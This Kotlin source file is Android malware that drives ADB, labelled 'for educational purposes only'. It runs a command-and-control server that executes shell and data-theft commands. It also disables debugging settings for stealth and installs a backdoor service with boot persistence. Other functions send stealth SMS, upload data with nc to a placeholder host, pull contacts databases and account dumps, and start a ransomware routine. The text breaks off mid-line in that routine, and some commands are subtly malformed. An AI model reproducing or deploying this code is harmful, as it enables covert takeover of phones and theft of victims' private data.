package Src.ADB

import Src.Utils.Logger
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import java.io.*
import java.net.ServerSocket
import java.net.Socket
import java.util.Properties
import java.util.concurrent.TimeUnit
import kotlin.random.Random

/**
 * A refined malicious ADB interface with enhanced features and asynchronous operations.
 * For educational purposes only.
 */
class ADBBase(private val logger: Logger = Logger()) {

    private val config = MaliciousConfig()
    private val c2ConfigLoader = C2ConfigLoader(logger) // Instantiate the loader
    private val c2Settings = c2ConfigLoader.loadConfig() // Load the configuration
    private val agentId = "android_${System.currentTimeMillis().toHexString()}"
    private var c2ServerSocket: ServerSocket? = null

    /**
     * Configuration for malicious operations.
     */
    data class MaliciousConfig(
        val tcpPort: Int = 5555,
        val commandTimeoutSeconds: Long = 15, // Increased timeout
        val silentMode: Boolean = true,
        val obfuscationDelayMs: Long = Random.nextLong(200, 1200)
    )

    /**
     * Represents the result of an ADB command execution.
     */
    data class CommandResult(val output: String, val error: String, val exitCode: Int)

    /**
     * Executes an ADB command asynchronously.
     */
    private fun executeAdbCommandAsync(command: List<String>): Flow<CommandResult> = flow {
        val processBuilder = ProcessBuilder(command)
        try {
            val process = processBuilder.start()
            val outputReader = BufferedReader(InputStreamReader(process.inputStream))
            val errorReader = BufferedReader(InputStreamReader(process.errorStream))
            val output = StringBuilder()
            val error = StringBuilder()

            val outputJob = launch(Dispatchers.IO) {
                outputReader.forEachLine { output.append(it).append("\n") }
            }
            val errorJob = launch(Dispatchers.IO) {
                errorReader.forEachLine { error.append(it).append("\n") }
            }

            val exitCode = withTimeoutOrNull(config.commandTimeoutSeconds * 1000) {
                awaitAll(outputJob, errorJob)
                process.waitFor()
            } ?: -1 // Indicate timeout

            emit(CommandResult(output.toString(), error.toString(), exitCode))
        } catch (e: IOException) {
            emit(CommandResult("", "Error executing command: ${e.message}", -1))
        }
    }

    /**
     * Executes a single ADB command and returns the result.
     */
    private suspend fun executeAdbCommand(command: String, logMessage: String): CommandResult {
        obfuscateExecution()
        logger.info(logMessage)
        return executeAdbCommandAsync(command.split(" ")).collect { return@collect it }
    }

    /**
     * Executes a batch of ADB commands sequentially.
     */
    private suspend fun executeAdbBatch(commands: List<String>, logMessage: String) {
        logger.info(logMessage)
        commands.forEach { cmd ->
            val result = executeAdbCommand(cmd, "Executing batch command: $cmd")
            if (result.exitCode != 0) {
                logger.warning("Batch command '$cmd' failed: ${result.error}")
            }
            delay(config.obfuscationDelayMs) // Add delay between commands
        }
    }

    private fun obfuscateExecution() {
        if (config.silentMode) {
            runBlocking { delay(config.obfuscationDelayMs) }
        }
    }

    private suspend fun parseIpAddress(output: String): String? {
        val pattern = Pattern.compile("inet (\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})")
        val matcher = pattern.matcher(output)
        return if (matcher.find()) matcher.group(1) else null
    }

    // --- C2 Server Functionality ---

    private fun getC2ServerPort(): Int = c2Settings.serverPort
    private fun getC2ServerIp(): String = c2Settings.serverIp
    private fun getC2ServerProtocol(): String = c2Settings.communicationProtocol

    /** Starts the C2 server on the Android device. */
    fun startC2Server() = CoroutineScope(Dispatchers.IO).launch {
        val port = getC2ServerPort()
        try {
            c2ServerSocket = ServerSocket(port)
            logger.info("C2 server started on port $port")
            while (isActive) {
                val clientSocket = c2ServerSocket?.accept()
                clientSocket?.let { launch { handleC2Client(it) } }
            }
        } catch (e: IOException) {
            logger.warning("Error starting C2 server: ${e.message}")
        } finally {
            c2ServerSocket?.close()
        }
    }

    /** Handles communication with a connected C2 client. */
    private suspend fun handleC2Client(clientSocket: Socket) {
        try {
            val reader = BufferedReader(InputStreamReader(clientSocket.getInputStream()))
            val writer = PrintWriter(clientSocket.getOutputStream(), true)
            writer.println("Android C2 server ready.")

            var command: String?
            while (isActive && reader.readLine().also { command = it } != null) {
                logger.info("Received C2 command from ${clientSocket.inetAddress.hostAddress}: $command")
                val response = executeC2Command(command)
                writer.println(response)
            }
            logger.info("C2 client disconnected: ${clientSocket.inetAddress.hostAddress}")
            clientSocket.close()
        } catch (e: IOException) {
            logger.warning("Error handling C2 client: ${e.message}")
        }
    }

    /** Executes commands received from the C2 client. */
    private suspend fun executeC2Command(command: String): String = when {
        command.startsWith("shell ") -> {
            val shellCommand = command.substringAfter("shell ").trim()
            executeMaliciousCommand(shellCommand).output.trim()
        }
        command.startsWith("steal ") -> {
            val path = command.substringAfter("steal ").trim()
            val destination = "/sdcard/c2_exfil"
            try {
                stealData(path, destination)
                "Data stolen from $path to $destination"
            } catch (e: ADBExploitException) {
                "Error stealing data: ${e.message}"
            }
        }
        command == "get_ip" -> getDeviceIpAddress() ?: "Could not retrieve IP address"
        command == "get_model" -> getDeviceModel()
        command == "list_downloads" -> listFiles("/sdcard/Download")
        command == "reboot" -> {
            rebootDevice()
            "Rebooting device..."
        }
        else -> "Unknown command: $command"
    }

    /** Stops the C2 server. */
    fun stopC2Server() {
        runBlocking {
            try {
                c2ServerSocket?.close()
                logger.info("C2 server stopped.")
            } catch (e: IOException) {
                logger.warning("Error stopping C2 server: ${e.message}")
            }
        }
    }

    // --- Core ADB Interaction Functions (Refactored for Async) ---

    suspend fun prepareAttack() {
        executeAdbBatch(
            listOf(
                "settings put global adb_enabled 0",
                "settings put global development_settings_enabled 0",
                "settings put global usb_debugging_enabled 0",
                "settings put global notification_access 0",
                "input keyevent 26"
            ), "Enabling stealth mode"
        )
        establishPersistentAccess()
        schedulePersistentTask()
        enableBootPersistence()
        listFiles("/sdcard/Download")
        trackIPAddress()
        startC2Server()
    }

    private suspend fun establishPersistentAccess() {
        val tcpResult = executeAdbCommand("tcpip ${config.tcpPort}", "Setting up TCP/IP on port ${config.tcpPort}")
        if (tcpResult.exitCode != 0) logger.warning("TCP/IP setup failed: ${tcpResult.error}")

        val ipOutput = executeAdbCommand("shell ip -f inet addr show wlan0", "Fetching device IP").output
        val ipAddress = parseIpAddress(ipOutput)
        ipAddress?.let {
            val connectResult = executeAdbCommand("connect $it:${config.tcpPort}", "Connecting to $it:${config.tcpPort}")
            if (connectResult.exitCode != 0) logger.warning("Connection failed: ${connectResult.error}")
            executeAdbCommand("shell am start-service -n com.malicious/.BackdoorService", "Installing backdoor service")
        } ?: logger.warning("Could not retrieve device IP.")
    }

    private suspend fun listFiles(path: String = "/sdcard/"): String =
        executeAdbCommand("shell ls -l '$path'", "Listing files in $path").output.trim()

    private suspend fun pullFile(devicePath: String, localPath: String) {
        val result = executeAdbCommand("pull '$devicePath' '$localPath'", "Pulling '$devicePath' to '$localPath'")
        if (result.exitCode != 0) logger.warning("File pull failed: ${result.error}")
    }

    private suspend fun pushFile(localPath: String, devicePath: String) {
        val result = executeAdbCommand("push '$localPath' '$devicePath'", "Pushing '$localPath' to '$devicePath'")
        if (result.exitCode != 0) logger.warning("File push failed: ${result.error}")
    }

    private suspend fun installApk(apkPath: String) {
        val result = executeAdbCommand("install -r '$apkPath'", "Installing APK: $apkPath")
        if (result.exitCode != 0) logger.warning("APK install failed: ${result.error}")
    }

    private suspend fun uninstallApp(packageName: String) {
        val result = executeAdbCommand("uninstall '$packageName'", "Uninstalling app: $packageName")
        if (result.exitCode != 0) logger.warning("App uninstall failed: ${result.error}")
    }

    private suspend fun clearAppData(packageName: String) {
        val result = executeAdbCommand("shell pm clear '$packageName'", "Clearing data for $packageName")
        if (result.exitCode != 0) logger.warning("Clear app data failed: ${result.error}")
    }

    suspend fun rebootDevice() {
        executeAdbCommand("reboot", "Rebooting device")
    }

    suspend fun takeScreenshot(filename: String = "/sdcard/screenshot.png") {
        executeAdbCommand("shell screencap '$filename'", "Taking screenshot to $filename")
        pullFile(filename, filename) // Pull to local for demonstration
    }

    suspend fun getDeviceModel(): String =
        executeAdbCommand("shell getprop ro.product.model", "Getting device model").output.trim()

    suspend fun getDeviceSerialNumber(): String =
        executeAdbCommand("shell getprop ro.serialno", "Getting device serial number").output.trim()

    suspend fun getAndroidVersion(): String =
        executeAdbCommand("shell getprop ro.build.version.release", "Getting Android version").output.trim()

    suspend fun readLogcat(): String =
        executeAdbCommand("logcat -d", "Reading logcat").output.trim()

    suspend fun isDeviceRooted(): Boolean =
        executeAdbCommand("shell su -c 'whoami'", "Checking root status").output.contains("root", ignoreCase = true)

    suspend fun isAdbAccessible(): Boolean =
        executeAdbCommand("get-state", "Checking ADB accessibility").output.contains("device", ignoreCase = true)

    private suspend fun schedulePersistentTask() {
        val alarmId = Random.nextInt(1000, 9999)
        val intentAction = "com.malicious.ACTION_PERSISTENT"
        val command = "shell am set-alarm -c -a '$intentAction' -w 60 com.malicious"
        executeAdbCommand(command, "Scheduling persistent task (ID: $alarmId, Action: $intentAction)")
        logger.info("Note: Requires a receiver on the device.")
    }

    private suspend fun enableBootPersistence() {
        val command = "shell su -c 'pm enable com.malicious/.BootReceiver'"
        executeAdbCommand(command, "Attempting boot persistence via BootReceiver")
        logger.info("Note: Requires a BootReceiver in the manifest and root.")
    }

    private suspend fun sendStealthSMS(phoneNumber: String, data: String) {
        val command = "shell am start -a android.intent.action.SENDTO -d sms:$phoneNumber --es sms_body \"$data\" --ez android.intent.extra.TEXT_ONLY true --ez android.intent.extra.SEND_EMPTY_BODY true"
        executeAdbCommand(command, "Sending stealth SMS to $phoneNumber")
    }

    private suspend fun uploadDataStealthily(data: String, uploadUrl: String = "http://fake-cloud.com/upload") {
        executeAdbCommand("shell sh -c 'echo \"$data\" | nc $uploadUrl 80'", "Simulating data upload")
    }

    private suspend fun extractTargetedContacts(keywords: List<String>): String {
        val query = keywords.joinToString("%' OR display_name LIKE '%")
        val command = "shell sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db \"SELECT display_name FROM contacts WHERE display_name LIKE '%$query%'\""
        return executeAdbCommand(command, "Extracting contacts matching keywords").output.trim()
    }

    private suspend fun executeMaliciousCommand(command: String): CommandResult {
        val rooted = isDeviceRooted()
        val finalCommand = if (rooted) "shell su -c '$command'" else "shell $command"
        return executeAdbCommand(finalCommand, "Executing malicious command: $command")
    }

    private suspend fun stealData(sourcePath: String, destinationPath: String) {
        val rooted = isDeviceRooted()
        val command = if (rooted) "shell su -c cp '$sourcePath' /sdcard/temp && pull /sdcard/temp '$destinationPath' && shell rm /sdcard/temp"
        else "pull '$sourcePath' '$destinationPath'"
        executeAdbCommand(command, "Stealing data from $sourcePath to $destinationPath")
    }

    private suspend fun dumpSystemInfo(destinationPath: String) {
        executeAdbBatch(
            listOf(
                "shell dumpsys account > '$destinationPath/accounts.txt'",
                "shell pm list packages -f > '$destinationPath/packages.txt'",
                "shell settings list global > '$destinationPath/settings.txt'",
                "shell getprop > '$destinationPath/properties.txt'"
            ), "Dumping system info to $destinationPath"
        )
    }

    suspend fun simulateRansomware() {
        executeAdbBatch(
            listOf("input keyevent 26", "shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message
